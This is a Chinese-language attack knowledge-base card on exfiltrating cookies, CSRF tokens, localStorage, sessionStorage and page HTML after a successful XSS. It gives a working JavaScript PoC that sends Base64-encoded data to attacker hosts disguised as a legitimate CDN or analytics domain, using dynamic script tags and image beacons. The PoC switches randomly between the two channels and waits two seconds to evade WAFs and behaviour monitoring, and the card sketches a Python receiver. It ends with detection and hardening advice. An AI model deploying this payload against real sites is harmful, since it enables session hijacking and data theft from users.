---
id: web-generic-xss-data-exfiltration-jsonp-image-beacon-multi-channel
title: XSS 敏感数据外带多通道：JSONP 回调 / new Image() 图片信标 / 双通道备份与随机切换 / 伪装合法 CDN 域名 / 按 CSP 选通道
type: scenario
domain: web
path: web/generic/xss
technique: xss-data-exfiltration-jsonp-image-beacon-multi-channel
tags:
- web
- xss
- dom-xss
- exfiltration
- jsonp
- image-beacon
- csp
- cdn-disguise
- cookie
- localstorage
- sessionstorage
- innerhtml
- waf-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-12
  verified_at: '2026-11-08T07:12:56+08:00'
  notes: 已对照原文核对：图05-07 攻击者 http.server/keykey.py 日志证实 JSONP/图片信标外带真实送达 cookie 与 storage；图04 显示 XSS 注入入口为控制台 Object.defineProperty 模拟，原文未证明 appName 可由外部污染，本卡范围仅限注入后外带，未夸大。
url: /docs/web/generic/xss/web-generic-xss-data-exfiltration-jsonp-image-beacon-multi-channel/
draft: false
kb_aliases:
- DOM XSS 数据外带
- JSONP 跨域数据劫持
- 图片信标 image beacon
- 双通道备份传输
- 随机切换 JSONP/Image
- 伪装合法 CDN 域名规避 WAF
- 延时触发绕过行为监控
- CSP script-src/img-src 通道选择
- btoa(JSON.stringify(...)) 外带编码
---

## 一句话结论

在已能在目标页面执行任意 JS（XSS）后，可把 `document.cookie`、`localStorage`、`sessionStorage`、`document.documentElement.innerHTML` 等敏感数据经多条隐蔽通道外带到攻击者服务器：用 `<script src=cdn/...?data=base64>` 的 JSONP 式请求承载完整数据、`new Image().src=pixel.gif?c=` 的图片信标承载关键字段，两通道互为备份、随机切换、延时 2 秒触发，并把请求域名伪装成合法 CDN/analytics 以规避 WAF 与行为监控；通道选择取决于目标 CSP——无 CSP 优先 JSONP 直传完整数据，有 CSP 则按 `script-src`/`img-src` 白名单决定伪装 CDN 域名（JSONP）或图片信标+压缩。

## 原理

- **外带的本质**：XSS 执行的 JS 与攻击者服务器之间需要一个"从目标页面发起的跨域请求"。浏览器允许 `<script src>`、`<img src>`、`new Image()` 等资源标签加载任意（或 CSP 允许的）外部 URL，且不受同源策略读取限制（无需 CORS 响应即可发出 GET 请求），因此把数据拼进 URL query 即可带出；`fetch`/`XMLHttpRequest` 反而受 CORS 约束，WebSocket/`navigator.sendBeacon` 是备选通道。
- **编码**：`btoa(JSON.stringify(data))` 把含 cookie/storage 的对象做 Base64 后放进 `?data=`，避免特殊字符破坏 URL；图片信标用 `encodeURIComponent(data.cookies)` 只带关键字段以缩短 URL（图片通道 URL 长度受限，故"隐蔽+长度优化"）。
- **JSONP 式通道**：动态 `document.createElement('script')`，`script.src = 'https://legit-cdn.org/log?callback=__exfil&data=' + btoa(...)`，append 到 body 即发出 GET；`callback=` 让它看起来像正常 JSONP/analytics 请求，域名伪装成可信 CDN 规避 WAF 域名黑名单与人工审计。
- **图片信标通道**：`new Image().src = 'https://log.tracking.com/pixel.gif?c=' + encodeURIComponent(document.cookie)`，图片请求最不易被拦截、可跨域、无需插入 DOM（也可 append `beaconImg`）。
- **双通道备份 + 随机切换**：同时准备 `jsonpFn()`（完整数据）与 `imgFn()`（关键数据），`Math.random() > 0.5 ? jsonpFn() : imgFn()` 随机选一路，或两路都发、互为备份；`setTimeout(..., 2000)` 延时触发，避开"页面加载即外连"的行为检测规则。
- **按 CSP 决策（图 08 流程）**：目标无 CSP → 优先 JSONP 直传完整数据；有 CSP → 分析 `script-src`/`img-src`：白名单允许某 CDN → 把外带域名伪装成该 CDN 走 `<script>`；白名单很严 → 退到 `img-src` 允许的图片信标并对数据压缩。注意这只是**选择不被 CSP 拦截的通道**，并未真正绕过 CSP 去执行内联脚本（原文标题"突破 CSP"实为按 CSP 选外带通道，不构成 CSP 绕过）。
- **为什么成立（本质）**：资源标签的跨域 GET 天然可携带 URL 数据、不受同源策略读取限制，且 CSP 白名单常包含 CDN/统计域名；把敏感数据编码进 query、伪装成正常资源请求、多通道冗余+随机+延时，即可在已有 XSS 执行能力下稳定外带，且降低被 WAF/行为监控发现的概率。
- **已验证**：原文在浏览器控制台以 `Object.defineProperty(web.portal,'appProps',{get:...})` 使 `getAppProps()` 的 `innerHTML` 渲染 `<img src=x onerror=...>` 触发 XSS，随后攻击者端 `http.server`/自定义 `BaseHTTPRequestHandler`（keykey.py）日志记录到 `GET /pixel.gif?c=CsrfToken=...`、`GET /log?callback=__exfil&data=...`、`GET /steal?callback=handleData&data=...` 等请求及解析出的 cookie/storage 数据（图 05~07），证明外带通道确实把数据送达。
- **不夸大**：本卡是"已有 XSS 执行能力后的数据外带原语"；原文对 XSS 的注入入口（如何污染后端 `/tas/web/portal/appProps` 的 `appName`）是用 `Object.defineProperty` 在控制台模拟的，未证明真实可控输入，故不把整条链包装成完整可复现的远程攻击（DOM XSS sink 本身单列为半链，见 cards.json）。

## 触发条件

- 已能在目标页面执行任意 JavaScript（任意类型 XSS 或已被注入的脚本），并可读取 `document.cookie`/`localStorage`/`sessionStorage`/DOM。
- 目标页面能发起对外资源请求（网络可达、CSP 的 `script-src`/`img-src` 或 `connect-src` 允许至少一个外部域名，或干脆无 CSP）。
- 攻击者拥有可记录 GET query 的接收端（如 `python -m http.server` 或自定义 Handler 打印 URL/headers/PAYLOAD）。
- 数据可经 Base64/URI 编码放进 URL，且长度在通道限制内（图片信标宜只带关键字段）。

## 利用步骤

1. 在 XSS payload 里组装数据对象：`{cookie: document.cookie, storage: JSON.stringify(localStorage), ss: JSON.stringify(sessionStorage), dom: document.documentElement.innerHTML.slice(0,2000)}`。
2. 构造 JSONP 通道：`const s=document.createElement('script'); s.src='https://<伪装的合法CDN>/analytics.js?cid=<随机>&data='+btoa(JSON.stringify(data));`。
3. 构造图片信标备份：`const img=new Image(); img.src='https://<统计域名>/pixel.gif?c='+encodeURIComponent(data.cookie);`。
4. 选择策略：无 CSP 直接发 JSONP；有 CSP 时按 `script-src`/`img-src` 白名单选可用通道（伪装 CDN 域名 / 图片信标+压缩）；可 `Math.random()>0.5?jsonpFn():imgFn()` 随机切换，或双通道都发互为备份。
5. `setTimeout(()=>{document.head.appendChild(s); document.body.appendChild(img);}, 2000)` 延时触发，避开行为监控。
6. 攻击者服务器记录 `GET /analytics.js?data=...` / `GET /pixel.gif?c=...`，解码 Base64 还原敏感数据（cookie/CsrfToken、storage、DOM 片段）。

## PoC

```javascript
// 前置：已在目标页面获得任意 JS 执行（本例由 <img src=x onerror=...> 触发）
(function () {
  const data = {
    cookie: document.cookie,
    ls: JSON.stringify(localStorage),
    ss: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML.slice(0, 2000)
  };
  const jsonpFn = () => {
    const s = document.createElement('script');
    s.src = 'https://cdn.trusted.com/analytics.js?cid=' + Math.random().toString(36).substr(2) +
            '&data=' + btoa(JSON.stringify(data));   // 伪装合法 CDN
    document.head.appendChild(s);
  };
  const imgFn = () => {
    new Image().src = 'https://log.tracking.com/pixel.gif?c=' + encodeURIComponent(data.cookie);
  };
  setTimeout(() => {
    if (Math.random() > 0.5) jsonpFn(); else imgFn();       // 随机切换
    // 或 jsonpFn(); imgFn(); 双通道备份
  }, 2000);                                                  // 延时绕过行为监控
})();
```

接收端（示意）：`python -m http.server 8000` 或自定义 `BaseHTTPRequestHandler.do_GET` 打印 `self.path`/headers/`PAYLOAD`，再对 `data` 做 Base64 解码。原文服务器日志出现 `GET /pixel.gif?c=CsrfToken=...`、`GET /log?callback=__exfil&data=...`（图 05~07）。

## 变体与关联

- **通道变体**：`navigator.sendBeacon`、`fetch(..., {mode:'no-cors'})`、WebSocket、`<link rel=preload>`、`<iframe src>`、CSS `url()`、DNS 外带等都可作为额外或替代通道；按 CSP 的 `connect-src`/`img-src`/`script-src` 选可用项。
- **隐蔽变体**：伪装 CDN/analytics 域名与路径、`callback=` 伪装 JSONP、`cid` 随机参数、延时与随机化、分块多请求、只带关键字段以缩短图片信标 URL、对数据做压缩/分片。
- **关联卡**：前置 XSS 触发类卡（如 DOM XSS via `innerHTML` 渲染后端 JSON、CSP `script-src 'self'` 下 JSONP 回调执行、iframe srcdoc、DOMPurify 重解析等）与本卡互补——那些负责"拿到 JS 执行"，本卡负责"把数据送出去"；库内 `web-generic-xss-csp-self-jsonp-callback-bypass` 是用 JSONP 回调**执行 JS**（不同 sink），本卡是用 `<script src>`/图片**外带数据**。
- **边界**：HttpOnly Cookie 读不到；严格 CSP（无外部 `script-src`/`img-src`/`connect-src`）或网络隔离/出网白名单会阻断通道；现代浏览器对第三方 Cookie/跨站资源请求的限制、URL 长度限制、SRI/可信类型（Trusted Types）也会提高门槛。原文"突破 CSP"只是按 CSP 选通道，不是 CSP 绕过，不应据此断言可绕过任意 CSP。

## 检测与防御

- **根因修复**：对进入 `innerHTML`/`outerHTML`/`document.write`/`v-html`/`dangerouslySetInnerHTML` 的所有数据做上下文相关编码或改用 `textContent`；后端 JSON 接口设置 `X-Content-Type-Options: nosniff`、`Content-Type: application/json` 并避免把不可信内容当 HTML。
- **CSP**：部署严格 `script-src`/`img-src`/`connect-src` 白名单（不含泛用 CDN）、`object-src 'none'`、`base-uri 'none'`，配合 Trusted Types 禁止字符串转 DOM，从源头减少可执行 XSS；注意图片信标仍可借 `img-src` 允许的统计域名外带，需审计白名单域名。
- **检测信号**：页面加载后向非业务 CDN/统计域名发起带异常长 `data=`/`c=` query 的 GET；请求含 Base64 大块、`callback=__exfil`、随机 `cid`、延时 2 秒集中外连；WAF/EDR 关注 `<script src>` 动态创建 + `new Image()` 同批出现、外带域名与业务无关、cookie/token 出现在 URL。
- **加固**：Cookie 加 `HttpOnly`/`Secure`/`SameSite`，降低 XSS 后可窃取的凭证价值；敏感数据不落 localStorage/sessionStorage；出站流量白名单与 DNS 监控阻断未授权外连；对第三方资源域名做定期审计。
